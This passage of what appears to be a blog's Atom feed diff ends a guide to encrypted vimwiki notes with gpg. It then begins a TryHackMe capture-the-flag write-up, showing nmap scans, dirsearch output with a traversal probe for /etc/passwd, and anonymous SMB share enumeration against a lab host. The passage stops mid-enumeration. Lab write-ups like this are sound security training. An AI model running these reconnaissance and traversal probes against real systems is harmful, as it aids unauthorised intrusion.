+&lt;li&gt;run &lt;code&gt;gpg --full-generate-key&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;select the default key type at the prompt&lt;/li&gt;
+&lt;li&gt;pick at least a key size of 4096 bits&lt;/li&gt;
+&lt;li&gt;set your key to never expire, which is the default length of time at the prompt&lt;/li&gt;
+&lt;li&gt;check your settings&lt;/li&gt;
+&lt;li&gt;add your id information&lt;/li&gt;
+&lt;li&gt;provide a strong passphrase when prompted&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;if you&amp;#39;d rather go crazy with ECC and ED25519 (which i encourage you to do), you can do the following instead:&lt;/p&gt;
+
+&lt;ul&gt;
+&lt;li&gt;run &lt;code&gt;gpg --expert --full-generate-key&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;pick &lt;code&gt;ECC and ECC&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;pick &lt;code&gt;Curve 25519&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;follow the same instructions as before&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;this part should be working now! create a &lt;code&gt;.md.gpg&lt;/code&gt; file, open it with vim, insert something and save it. if you &lt;code&gt;cat&lt;/code&gt; the file, this should return the encrypted, ascii-armored content which roughly looks like the following:&lt;/p&gt;
+
+&lt;div class="highlight"&gt;&lt;pre class="highlight shell"&gt;&lt;code&gt;&lt;span class="nt"&gt;-----BEGIN&lt;/span&gt; PGP MESSAGE-----
+
+hQIMA4RrtUt4dcSyAQ/8DAdDoYkJE8d4kq+dsZykX9qR2cEVjy99RLaaeT22HffP
+SKc3zKXMz6IDVEx1+KBD0zsDR1EZA6tiOoXwqjZnU/CXwuGpE6yYrIjQZiyVsDhV
+zeYupkji0z8JTg8QfAfgW2TvEpctuX7DaXyn26qmg6x1KVhmxDAaaaqQzJIu2dXg
+mM8gnU8Qgx0/hPUf9Axm4lTU/iqZLEFOr+ysRn7BX4OSnkfWUIKGOASLqX7l42/+
+s8YxKRSsJEAf/vdUxgEABTRKQ7Z/ciMn7Lp8gqz4hhLvgwG7gZz6dYgO5f3F0L+h
+oMJnTKOHxkcYPRJODA7jclYqTapSkHXTs1Gl0/d2vjuzYOS9izs6p+iG5eXaZ93a
+83gc4FgVAsxnLPx+M8KmmgQBM2f91NUbYdcA/8sGmzSpHBm7vVhCqm9iZLmqFgtW
+C2Ygwek5KTNuQ0kNYaGz88047oaQn6jYTR146YWxZBkTOO/9xsEQxlrwBOVLW9vX
+qpnRI6Bj0c7Gnb5eh3TBBKJyfKB1r41PBzAoMCr4LBFNjJhtFQmrcV/h+6kqYpE9
+xSju2Ux72H3Nq1UBmGO8u2Or8BgQXRnWmTjaGFKetUac1KuHVdSl6gkTkK2TVSJh
+dwMiPavB4hf6onJqGlW9746glNTRdfmHU9Bvsz6iBJ3HV6EOTCG2XLyU2fr6vvXS
+UQEWWmozZNWc75PUQBSwXDeLUTZU7n3QG0O2dx6brjxbx0hrv3oYYAersvX3NrPK
+mgkSHV0XVcSVvG4uLma1ilDMWKb9+DjiZDt2FvqVFV7E3A&lt;span class="o"&gt;==&lt;/span&gt;
+&lt;span class="o"&gt;=&lt;/span&gt;zjQv
+&lt;span class="nt"&gt;-----END&lt;/span&gt; PGP MESSAGE-----
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;p&gt;open it again with vim, and you should see the plaintext message. perfect, moving on!&lt;/p&gt;
+
+&lt;h2&gt;setting up vimwiki&lt;/h2&gt;
+
+&lt;p&gt;by default, vimwiki uses its own syntax. markdown is however supported with a few option changes.&lt;/p&gt;
+
+&lt;p&gt;the plugin also needs some specific settings to be set, so let&amp;#39;s do both:&lt;/p&gt;
+
+&lt;div class="highlight"&gt;&lt;pre class="highlight viml"&gt;&lt;code&gt;&lt;span class="k"&gt;set&lt;/span&gt; &lt;span class="nb"&gt;nocompatible&lt;/span&gt;
+filetypelugin &lt;span class="k"&gt;on&lt;/span&gt;
+&lt;span class="nb"&gt;syntax&lt;/span&gt; &lt;span class="k"&gt;on&lt;/span&gt;
+
+&lt;span class="k"&gt;let&lt;/span&gt; &lt;span class="nv"&gt;g:vimwiki_list&lt;/span&gt; &lt;span class="p"&gt;=&lt;/span&gt; &lt;span class="p"&gt;[{&lt;/span&gt;&lt;span class="s1"&gt;'path'&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="s1"&gt;'~/wiki/'&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
+&lt;span class="se"&gt;                      \&lt;/span&gt; &lt;span class="s1"&gt;'syntax'&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="s1"&gt;'markdown'&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s1"&gt;'ext'&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="s1"&gt;'.md.gpg'&lt;/span&gt;&lt;span class="p"&gt;}]&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;p&gt;now vimwiki will identify &lt;code&gt;.md.gpg&lt;/code&gt; as its default filetype, and the directory for your entire wiki will be located at &lt;code&gt;~/wiki/&lt;/code&gt;. easy enough.&lt;/p&gt;
+
+&lt;p&gt;learning everything about vimwiki is beyond the scope of this post, but we can still mention a few things. first, you need to create an index by running &lt;code&gt;vim&lt;/code&gt; and press &lt;code&gt;&amp;lt;Leader&amp;gt;ww&lt;/code&gt;.&lt;/p&gt;
+
+&lt;p&gt;edit the document as you like, and press &lt;code&gt;&amp;lt;enter&amp;gt;&lt;/code&gt; with your cursor placed on a word of your choosing: you just made a link! if you press &lt;code&gt;&amp;lt;enter&amp;gt;&lt;/code&gt; again, you&amp;#39;ll open a new file which you can edit to your linking. press backspace, and you&amp;#39;re back to your index.&lt;/p&gt;
+
+&lt;p&gt;this hierarchical way of handling files makes vimwiki very suitable for personal notes and even a zettelkasten system (there is an &lt;a href="https://github.com/michal-h21/vim-zettel" rel="nofollow"&gt;additional plugin&lt;/a&gt; for it). you can learn more about it in the &lt;a href="https://github.com/vimwiki/vimwiki" rel="nofollow"&gt;repo&amp;#39;s README&lt;/a&gt; and &lt;a href="https://vimwiki.github.io/vimwikiwiki/" rel="nofollow"&gt;vimwiki&amp;#39;s wiki&lt;/a&gt;.&lt;/p&gt;
+
+&lt;p&gt;we&amp;#39;re done with setting the plugin, but these are some options i like to tweak:&lt;/p&gt;
+
+&lt;div class="highlight"&gt;&lt;pre class="highlight viml"&gt;&lt;code&gt;&lt;span class="c"&gt;" automatically insert a header when creating a new link&lt;/span&gt;
+&lt;span class="k"&gt;let&lt;/span&gt; &lt;span class="nv"&gt;g:vimwiki_auto_header&lt;/span&gt; &lt;span class="p"&gt;=&lt;/span&gt; &lt;span class="m"&gt;1&lt;/span&gt;
+&lt;span class="c"&gt;" use underscores to replace spaces in the file names&lt;/span&gt;
+&lt;span class="k"&gt;let&lt;/span&gt; &lt;span class="nv"&gt;g:vimwiki_links_space_char&lt;/span&gt; &lt;span class="p"&gt;=&lt;/span&gt; &lt;span class="s1"&gt;'_'&lt;/span&gt;
+&lt;span class="c"&gt;" disable all concealing&lt;/span&gt;
+&lt;span class="k"&gt;let&lt;/span&gt; &lt;span class="nv"&gt;g:vimwiki_conceal_onechar_markers&lt;/span&gt; &lt;span class="p"&gt;=&lt;/span&gt; &lt;span class="m"&gt;0&lt;/span&gt;
+&lt;span class="c"&gt;" disable URL shortening&lt;/span&gt;
+&lt;span class="k"&gt;let&lt;/span&gt; &lt;span class="nv"&gt;g:vimwiki_url_maxsave&lt;/span&gt; &lt;span class="p"&gt;=&lt;/span&gt; &lt;span class="m"&gt;0&lt;/span&gt; 
+&lt;span class="c"&gt;" don't load vimwiki for markdown files located somewhere else&lt;/span&gt;
+&lt;span class="k"&gt;let&lt;/span&gt; &lt;span class="nv"&gt;g:vimwiki_global_ext&lt;/span&gt; &lt;span class="p"&gt;=&lt;/span&gt; &lt;span class="m"&gt;0&lt;/span&gt;
+&lt;span class="c"&gt;" bold headers&lt;/span&gt;
+&lt;span class="k"&gt;hi&lt;/span&gt; VimwikiHeader1 cterm&lt;span class="p"&gt;=&lt;/span&gt;&lt;span class="nb"&gt;bold&lt;/span&gt; &lt;span class="k"&gt;gui&lt;/span&gt;&lt;span class="p"&gt;=&lt;/span&gt;&lt;span class="nb"&gt;bold&lt;/span&gt; 
+&lt;span class="k"&gt;hi&lt;/span&gt; VimwikiHeader2 cterm&lt;span class="p"&gt;=&lt;/span&gt;&lt;span class="nb"&gt;bold&lt;/span&gt; &lt;span class="k"&gt;gui&lt;/span&gt;&lt;span class="p"&gt;=&lt;/span&gt;&lt;span class="nb"&gt;bold&lt;/span&gt; 
+&lt;span class="k"&gt;hi&lt;/span&gt; VimwikiHeader3 cterm&lt;span class="p"&gt;=&lt;/span&gt;&lt;span class="nb"&gt;bold&lt;/span&gt; &lt;span class="k"&gt;gui&lt;/span&gt;&lt;span class="p"&gt;=&lt;/span&gt;&lt;span class="nb"&gt;bold&lt;/span&gt; 
+&lt;span class="k"&gt;hi&lt;/span&gt; VimwikiHeader4 cterm&lt;span class="p"&gt;=&lt;/span&gt;&lt;span class="nb"&gt;bold&lt;/span&gt; &lt;span class="k"&gt;gui&lt;/span&gt;&lt;span class="p"&gt;=&lt;/span&gt;&lt;span class="nb"&gt;bold&lt;/span&gt; 
+&lt;span class="k"&gt;hi&lt;/span&gt; VimwikiHeader5 cterm&lt;span class="p"&gt;=&lt;/span&gt;&lt;span class="nb"&gt;bold&lt;/span&gt; &lt;span class="k"&gt;gui&lt;/span&gt;&lt;span class="p"&gt;=&lt;/span&gt;&lt;span class="nb"&gt;bold&lt;/span&gt; 
+&lt;span class="k"&gt;hi&lt;/span&gt; VimwikiHeader6 cterm&lt;span class="p"&gt;=&lt;/span&gt;&lt;span class="nb"&gt;bold&lt;/span&gt; &lt;span class="k"&gt;gui&lt;/span&gt;&lt;span class="p"&gt;=&lt;/span&gt;&lt;span class="nb"&gt;bold&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;h2&gt;autocapitalisation&lt;/h2&gt;
+
+&lt;p&gt;this feature will be quick to implement. the following function will handle autocapitalisation wherever we want to:&lt;/p&gt;
+
+&lt;div class="highlight"&gt;&lt;pre class="highlight viml"&gt;&lt;code&gt;func&lt;span class="p"&gt;!&lt;/span&gt; AutoCapitalisation&lt;span class="p"&gt;()&lt;/span&gt; 
+    augroup SENTENCES 
+        &lt;span class="k"&gt;au&lt;/span&gt;&lt;span class="p"&gt;!&lt;/span&gt; 
+        autocmd &lt;span class="nb"&gt;InsertCharPre&lt;/span&gt; * &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="nb"&gt;search&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;'\v(%^|[.!?]\_s+|\_^\-\s|\_^\*\s|\_^#+\s|\n\n)%#'&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s1"&gt;'bcnw'&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;!=&lt;/span&gt; &lt;span class="m"&gt;0&lt;/span&gt; &lt;span class="p"&gt;|&lt;/span&gt; &lt;span class="k"&gt;let&lt;/span&gt; &lt;span class="k"&gt;v&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;char &lt;span class="p"&gt;=&lt;/span&gt; &lt;span class="nb"&gt;toupper&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="k"&gt;v&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;char&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;|&lt;/span&gt; &lt;span class="k"&gt;endif&lt;/span&gt; 
+    augroup END 
+endfu
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;p&gt;it has been tweaked from the following source and does a really nice job:&lt;/p&gt;
+
+&lt;ul&gt;
+&lt;li&gt;&lt;a href="https://davidxmoody.com/2014/vim-auto-capitalisation/" rel="nofollow"&gt;https://davidxmoody.com/2014/vim-auto-capitalisation/&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;(thanks david moody for sharing it!)&lt;/p&gt;
+
+&lt;p&gt;to enable the function with vimwiki, all we need to do is the following:&lt;/p&gt;
+
+&lt;div class="highlight"&gt;&lt;pre class="highlight viml"&gt;&lt;code&gt;autocmd &lt;span class="nb"&gt;FileType&lt;/span&gt; markdown &lt;span class="k"&gt;call&lt;/span&gt; AutoCapitalisation&lt;span class="p"&gt;()&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;h2&gt;easily pasting images in markdown files&lt;/h2&gt;
+
+&lt;p&gt;the &lt;code&gt;md-img-paste&lt;/code&gt; plugin uses &lt;code&gt;xclip&lt;/code&gt; to work, so let&amp;#39;s install it first:&lt;/p&gt;
+
+&lt;div class="highlight"&gt;&lt;pre class="highlight shell"&gt;&lt;code&gt;&lt;span class="nb"&gt;sudo &lt;/span&gt;apt &lt;span class="nb"&gt;install &lt;/span&gt;xclip
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;p&gt;the following options can be tweaked to your liking. by default, the plugin will create your image folder at the same location of the currently edited file, which works great for us:&lt;/p&gt;
+
+&lt;div class="highlight"&gt;&lt;pre class="highlight viml"&gt;&lt;code&gt;autocmd &lt;span class="nb"&gt;FileType&lt;/span&gt; markdown nmap &lt;span class="p"&gt;&amp;lt;&lt;/span&gt;&lt;span class="k"&gt;buffer&lt;/span&gt;&lt;span class="p"&gt;&amp;gt;&amp;lt;&lt;/span&gt;&lt;span class="k"&gt;silent&lt;/span&gt;&lt;span class="p"&gt;&amp;gt;&lt;/span&gt; &lt;span class="p"&gt;&amp;lt;&lt;/span&gt;leader&lt;span class="p"&gt;&amp;gt;,&lt;/span&gt; &lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="k"&gt;call&lt;/span&gt; mdip#MarkdownClipboardImage&lt;span class="p"&gt;()&amp;lt;&lt;/span&gt;CR&lt;span class="p"&gt;&amp;gt;&lt;/span&gt;
+&lt;span class="c"&gt;" there are some defaults for image directory and image name, you can change them&lt;/span&gt;
+&lt;span class="k"&gt;let&lt;/span&gt; &lt;span class="nv"&gt;g:mdip_imgdir&lt;/span&gt; &lt;span class="p"&gt;=&lt;/span&gt; &lt;span class="s1"&gt;'images'&lt;/span&gt;
+&lt;span class="k"&gt;let&lt;/span&gt; &lt;span class="nv"&gt;g:mdip_imgname&lt;/span&gt; &lt;span class="p"&gt;=&lt;/span&gt; &lt;span class="s1"&gt;'image'&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;h2&gt;markdown preview&lt;/h2&gt;
+
+&lt;p&gt;this plugin works splendidly well out of the box. just use &lt;code&gt;:MarkdownPreview&lt;/code&gt; for a live preview and &lt;code&gt;:MarkdownPreviewStop&lt;/code&gt; to stop the service. i only added this shortcut for easy toggling:&lt;/p&gt;
+
+&lt;div class="highlight"&gt;&lt;pre class="highlight viml"&gt;&lt;code&gt;autocmd &lt;span class="nb"&gt;FileType&lt;/span&gt; markdown nmap &lt;span class="p"&gt;&amp;lt;&lt;/span&gt;leader&lt;span class="p"&gt;&amp;gt;&lt;/span&gt;&lt;span class="k"&gt;n&lt;/span&gt; &lt;span class="p"&gt;:&lt;/span&gt;MarkdownPreviewToggle&lt;span class="p"&gt;&amp;lt;&lt;/span&gt;CR&lt;span class="p"&gt;&amp;gt;&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;p&gt;it also supports preview of diagrams written with mermaid, katex, and others, really an amazing plugin.&lt;/p&gt;
+
+&lt;h2&gt;optional (but amazing): goyo&lt;/h2&gt;
+
+&lt;p&gt;goyo is a vim plugin that provides a clutter-free interface for writing in vim: i really enjoyed using it for a long time now, and nothing else quite matched the experience. i recommend checking out the &lt;a href="https://github.com/junegunn/goyo.vim" rel="nofollow"&gt;GitHub repo&lt;/a&gt; to get a general feel of the interface.&lt;/p&gt;
+
+&lt;p&gt;if you want to use it automatically with vimwiki, add the following line in your &lt;code&gt;.vimrc&lt;/code&gt;:&lt;/p&gt;
+
+&lt;div class="highlight"&gt;&lt;pre class="highlight viml"&gt;&lt;code&gt;&lt;span class="k"&gt;au&lt;/span&gt; &lt;span class="nb"&gt;VimEnter&lt;/span&gt; *&lt;span class="p"&gt;.&lt;/span&gt;md&lt;span class="p"&gt;.&lt;/span&gt;gpg &lt;span class="nb"&gt;execute&lt;/span&gt; &lt;span class="s2"&gt;":Goyo"&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;h2&gt;caveats&lt;/h2&gt;
+
+&lt;p&gt;switching to vimwiki has a few caveats, at least with my current settings:&lt;/p&gt;
+
+&lt;ul&gt;
+&lt;li&gt;file names are not encrypted&lt;/li&gt;
+&lt;li&gt;images are not encrypted&lt;/li&gt;
+&lt;li&gt;encrypting things through vim is... a peculiar experience to say the least&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;but in my use case, i can live with that.&lt;/p&gt;
+
+&lt;p&gt;i&amp;#39;m always open to suggestions and my vim scripting is not the best, but so far the experience is really pleasant. being able to quickly write notes from the CLI with the full power of vim available is way better than any alternative i could find!&lt;/p&gt;
+
+&lt;h2&gt;tl;dr: just give me the script!&lt;/h2&gt;
+
+&lt;p&gt;sure thing: &lt;a href="https://gist.github.com/ovelny/72659e841c1dbcee173eb244c8609252" rel="nofollow"&gt;https://gist.github.com/ovelny/72659e841c1dbcee173eb244c8609252&lt;/a&gt;&lt;/p&gt;
+
+&lt;blockquote&gt;
+&lt;p&gt;~ want to leave a comment about this post? you can send me a message on &lt;a href="https://curiouscat.qa/Ovelny" rel="nofollow"&gt;curiouscat&lt;/a&gt; without an account, or reply on &lt;a href="https://twitter.com/ovelny/status/1421421316205318145" rel="nofollow"&gt;twitter&lt;/a&gt; if you like!&lt;/p&gt;
+&lt;/blockquote&gt;
+</content>
+  </entry>
+  <entry>
+    <id>tag:ovelny.sh,2021-03-12:/blog/tryhackme-writeup-relevant/</id>
+    <title type="html">tryhackme writeup: relevant</title>
+    <published>2021-03-12T00:00:00Z</published>
+    <updated>2021-03-12T00:00:00Z</updated>
+    <link rel="alternate" href="https://ovelny.sh/blog/tryhackme-writeup-relevant/" type="text/html"/>
+    <content type="html">&lt;p&gt;relevant is a tryhackme room designed to simulate a black box penetration test. as such, no information is provided about the target whatsoever, with the exception of its scope. as proof of exploitation, two flags must be secured:&lt;/p&gt;
+
+&lt;ul&gt;
+&lt;li&gt;&lt;strong&gt;user.txt&lt;/strong&gt;&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;root.txt&lt;/strong&gt;&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;while the target has several vulnerabilities that can be exploited, this write-up will only focus on one of them. let&amp;#39;s begin!&lt;/p&gt;
+
+&lt;h2&gt;enumeration&lt;/h2&gt;
+
+&lt;p&gt;as always, a good point to start with active reconnaissance is to enumerate open ports and services on our target. let&amp;#39;s begin with &lt;code&gt;nmap&lt;/code&gt;.&lt;/p&gt;
+
+&lt;h3&gt;nmap&lt;/h3&gt;
+
+&lt;p&gt;as a start, we will use &lt;code&gt;nmap&lt;/code&gt; with the &lt;code&gt;-sC&lt;/code&gt; and &lt;code&gt;-sV&lt;/code&gt; flags on our target. as a reminder, these scans will do the following:&lt;/p&gt;
+
+&lt;ul&gt;
+&lt;li&gt;&lt;code&gt;-sC&lt;/code&gt;: equivalent to &lt;code&gt;--script=default&lt;/code&gt;. will run default scripts on found ports/services.&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;-sV&lt;/code&gt;: probe open ports to determine service/version info.&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;let&amp;#39;s also enumerate all ports with &lt;code&gt;-p-&lt;/code&gt; for good measure:&lt;/p&gt;
+
+&lt;div class="highlight"&gt;&lt;pre class="highlight shell"&gt;&lt;code&gt;nmap &lt;span class="nt"&gt;-sC&lt;/span&gt; &lt;span class="nt"&gt;-sV&lt;/span&gt; &lt;span class="nt"&gt;-p-&lt;/span&gt; 10.10.126.101
+Starting Nmap 7.91 &lt;span class="o"&gt;(&lt;/span&gt; https://nmap.org &lt;span class="o"&gt;)&lt;/span&gt; at 2021-03-01 13:48 CET
+Nmap scan report &lt;span class="k"&gt;for &lt;/span&gt;10.10.126.101
+Host is up &lt;span class="o"&gt;(&lt;/span&gt;0.029s latency&lt;span class="o"&gt;)&lt;/span&gt;&lt;span class="nb"&gt;.&lt;/span&gt;
+Not shown: 65527 filtered ports
+PORT      STATE SERVICE       VERSION
+80/tcp    open  http          Microsoft IIS httpd 10.0
+| http-methods:
+|_  Potentially risky methods: TRACE
+|_http-server-header: Microsoft-IIS/10.0
+|_http-title: IIS Windows Server
+135/tcp   open  msrpc         Microsoft Windows RPC
+139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
+445/tcp   open  microsoft-ds  Windows Server 2016 Standard Evaluation 14393 microsoft-ds
+3389/tcp  open  ms-wbt-server Microsoft Terminal Services
+| rdp-ntlm-info:
+|   Target_Name: RELEVANT
+|   NetBIOS_Domain_Name: RELEVANT
+|   NetBIOS_Computer_Name: RELEVANT
+|   DNS_Domain_Name: Relevant
+|   DNS_Computer_Name: Relevant
+|   Product_Version: 10.0.14393
+|_  System_Time: 2021-03-01T12:51:53+00:00
+| ssl-cert: Subject: &lt;span class="nv"&gt;commonName&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;Relevant
+| Not valid before: 2021-02-28T12:48:34
+|_Not valid after:  2021-08-30T12:48:34
+|_ssl-date: 2021-03-01T12:52:32+00:00&lt;span class="p"&gt;;&lt;/span&gt; 0s from scanner time.
+49663/tcp open  http          Microsoft IIS httpd 10.0
+| http-methods:
+|_  Potentially risky methods: TRACE
+|_http-server-header: Microsoft-IIS/10.0
+|_http-title: IIS Windows Server
+49668/tcp open  msrpc         Microsoft Windows RPC
+49669/tcp open  msrpc         Microsoft Windows RPC
+Service Info: OSs: Windows, Windows Server 2008 R2 - 2012&lt;span class="p"&gt;;&lt;/span&gt; CPE: cpe:/o:microsoft:windows
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;p&gt;and here are the host script results ran against these findings:&lt;/p&gt;
+
+&lt;div class="highlight"&gt;&lt;pre class="highlight shell"&gt;&lt;code&gt;Host script results:
+|_clock-skew: mean: 1h36m01s, deviation: 3h34m41s, median: 0s
+| smb-os-discovery:
+|   OS: Windows Server 2016 Standard Evaluation 14393 &lt;span class="o"&gt;(&lt;/span&gt;Windows Server 2016 Standard Evaluation 6.3&lt;span class="o"&gt;)&lt;/span&gt;
+|   Computer name: Relevant
+|   NetBIOS computer name: RELEVANT&lt;span class="se"&gt;\x&lt;/span&gt;00
+|   Workgroup: WORKGROUP&lt;span class="se"&gt;\x&lt;/span&gt;00
+|_  System &lt;span class="nb"&gt;time&lt;/span&gt;: 2021-03-01T04:51:56-08:00
+| smb-security-mode:
+|   account_used: guest
+|   authentication_level: user
+|   challenge_response: supported
+|_  message_signing: disabled &lt;span class="o"&gt;(&lt;/span&gt;dangerous, but default&lt;span class="o"&gt;)&lt;/span&gt;
+| smb2-security-mode:
+|   2.02:
+|_    Message signing enabled but not required
+| smb2-time:
+|   &lt;span class="nb"&gt;date&lt;/span&gt;: 2021-03-01T12:51:54
+|_  start_date: 2021-03-01T12:48:50
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;p&gt;we&amp;#39;re getting a few interesting hints so far for exploitation, and also two HTTP services opened on port 80 and 49663. let&amp;#39;s check where this might lead us.&lt;/p&gt;
+
+&lt;h3&gt;websites / web services&lt;/h3&gt;
+
+&lt;p&gt;both of the HTTP services lead us to the Microsoft IIS server default page:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src="https://ovelny.sh/assets/images/tryhackme-writeup-relevant/1.jpg" alt="1.jpg"&gt;&lt;/p&gt;
+
+&lt;p&gt;dirsearch results suggest something fishy. why would we have a directory traversal vulnerability for /etc/passwd on a windows server? looks like we might encounter some red herrings on this target.&lt;/p&gt;
+
+&lt;div class="highlight"&gt;&lt;pre class="highlight shell"&gt;&lt;code&gt;Target: http://10.10.32.152/
+
+Output File: /home/ovelny/repos/dirsearch/reports/10.10.32.152/_21-03-01_18-17-13.txt
+
+&lt;span class="o"&gt;[&lt;/span&gt;18:17:13] Starting:
+&lt;span class="o"&gt;[&lt;/span&gt;18:17:14] 403 -  312B  - /%2e%2e//google.com
+&lt;span class="o"&gt;[&lt;/span&gt;18:17:18] 403 -    2KB - /Trace.axd
+&lt;span class="o"&gt;[&lt;/span&gt;18:17:19] 403 -  312B  - /&lt;span class="se"&gt;\.&lt;/span&gt;.&lt;span class="se"&gt;\.&lt;/span&gt;.&lt;span class="se"&gt;\.&lt;/span&gt;.&lt;span class="se"&gt;\.&lt;/span&gt;.&lt;span class="se"&gt;\.&lt;/span&gt;.&lt;span class="se"&gt;\.&lt;/span&gt;.&lt;span class="se"&gt;\.&lt;/span&gt;.&lt;span class="se"&gt;\.&lt;/span&gt;.&lt;span class="se"&gt;\.&lt;/span&gt;.&lt;span class="se"&gt;\e&lt;/span&gt;tc&lt;span class="se"&gt;\p&lt;/span&gt;asswd
+
+Task Completed
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;p&gt;port 49663 doesn&amp;#39;t lead to interesting results either, as the few additional pages can&amp;#39;t be exploited for anything meaningful:&lt;/p&gt;
+
+&lt;div class="highlight"&gt;&lt;pre class="highlight shell"&gt;&lt;code&gt;Target: http://10.10.32.152:49663/
+
+Output File: /home/ovelny/repos/dirsearch/reports/10.10.32.152/_21-03-01_18-19-38.txt
+
+&lt;span class="o"&gt;[&lt;/span&gt;18:19:38] Starting:
+&lt;span class="o"&gt;[&lt;/span&gt;18:19:39] 403 -  312B  - /%2e%2e//google.com
+&lt;span class="o"&gt;[&lt;/span&gt;18:19:54] 403 -    2KB - /Trace.axd
+&lt;span class="o"&gt;[&lt;/span&gt;18:19:55] 403 -  312B  - /&lt;span class="se"&gt;\.&lt;/span&gt;.&lt;span class="se"&gt;\.&lt;/span&gt;.&lt;span class="se"&gt;\.&lt;/span&gt;.&lt;span class="se"&gt;\.&lt;/span&gt;.&lt;span class="se"&gt;\.&lt;/span&gt;.&lt;span class="se"&gt;\.&lt;/span&gt;.&lt;span class="se"&gt;\.&lt;/span&gt;.&lt;span class="se"&gt;\.&lt;/span&gt;.&lt;span class="se"&gt;\.&lt;/span&gt;.&lt;span class="se"&gt;\e&lt;/span&gt;tc&lt;span class="se"&gt;\p&lt;/span&gt;asswd
+&lt;span class="o"&gt;[&lt;/span&gt;18:20:07] 200 -    0B  - /aspnet_client/
+&lt;span class="o"&gt;[&lt;/span&gt;18:20:07] 301 -  163B  - /aspnet_client  -&amp;gt;  http://10.10.32.152:49663/aspnet_client/
+
+Task Completed
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;p&gt;as we saw port 445 being open, samba naturally comes next for enumeration.&lt;/p&gt;
+
+&lt;h3&gt;SMB enumeration&lt;/h3&gt;
+
+&lt;p&gt;at first, nmap scripts targeting SMB protocols seem to lead us to something juicy: perhaps this target is vulnerable to eternalblue!&lt;/p&gt;
+
+&lt;div class="highlight"&gt;&lt;pre class="highlight shell"&gt;&lt;code&gt;nmap &lt;span class="nt"&gt;-p&lt;/span&gt; 445 &lt;span class="nt"&gt;--script&lt;/span&gt; smb-protocols 10.10.32.152
+Starting Nmap 7.91 &lt;span class="o"&gt;(&lt;/span&gt; https://nmap.org &lt;span class="o"&gt;)&lt;/span&gt; at 2021-03-01 18:28 CET
+Nmap scan report &lt;span class="k"&gt;for &lt;/span&gt;10.10.32.152
+Host is up &lt;span class="o"&gt;(&lt;/span&gt;0.044s latency&lt;span class="o"&gt;)&lt;/span&gt;&lt;span class="nb"&gt;.&lt;/span&gt;
+
+PORT    STATE SERVICE
+445/tcp open  microsoft-ds
+
+Host script results:
+| smb-protocols:
+|   dialects:
+|     NT LM 0.12 &lt;span class="o"&gt;(&lt;/span&gt;SMBv1&lt;span class="o"&gt;)&lt;/span&gt; &lt;span class="o"&gt;[&lt;/span&gt;dangerous, but default]
+|     2.02
+|     2.10
+|     3.00
+|     3.02
+|_    3.11
+
+Nmap &lt;span class="k"&gt;done&lt;/span&gt;: 1 IP address &lt;span class="o"&gt;(&lt;/span&gt;1 host up&lt;span class="o"&gt;)&lt;/span&gt; scanned &lt;span class="k"&gt;in &lt;/span&gt;8.57 seconds
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;p&gt;that would be too good to be true right? well, that&amp;#39;s because it is. SMB1 is disabled:&lt;/p&gt;
+
+&lt;div class="highlight"&gt;&lt;pre class="highlight shell"&gt;&lt;code&gt;smbclient &lt;span class="nt"&gt;-N&lt;/span&gt; &lt;span class="nt"&gt;-L&lt;/span&gt; &lt;span class="se"&gt;\\\\&lt;/span&gt;10.10.32.152
+
+        Sharename       Type      Comment
+        &lt;span class="nt"&gt;---------&lt;/span&gt;       &lt;span class="nt"&gt;----&lt;/span&gt;      &lt;span class="nt"&gt;-------&lt;/span&gt;
+        ADMIN&lt;span class="nv"&gt;$ &lt;/span&gt;         Disk      Remote Admin
+        C&lt;span class="nv"&gt;$ &lt;/span&gt;             Disk      Default share
